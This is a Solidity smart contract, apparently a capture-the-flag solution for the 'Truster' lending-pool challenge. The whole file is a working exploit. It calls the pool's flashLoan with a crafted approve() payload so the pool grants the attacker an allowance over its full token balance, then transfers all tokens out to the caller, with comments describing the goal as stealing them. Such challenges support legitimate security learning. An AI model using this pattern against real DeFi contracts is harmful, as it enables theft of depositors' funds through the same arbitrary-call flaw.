// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface TrusterLenderPool {
    function flashLoan(uint256, address, address, bytes calldata) external returns(bool);
}
interface IERC20 {
    function transferFrom(address, address, uint256) external returns(bool);
    function balanceOf(address) external returns(uint256);
}

contract TrusterAttack {
    
    TrusterLenderPool private immutable target;
    IERC20 private immutable token;

    constructor(TrusterLenderPool _target, IERC20 _token) {
        target = _target;
        token = _token;
    }

    function attack() external {
        //save total supply of tokens to steal
        uint256 targetBalance = token.balanceOf(address(target));

        // contract can every call to given address
        // we can approve our address to transfer out all tokens
        target.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)", 
                address(this),
                targetBalance
            )
        );

        token.transferFrom(address(target), msg.sender, targetBalance);
    }
}
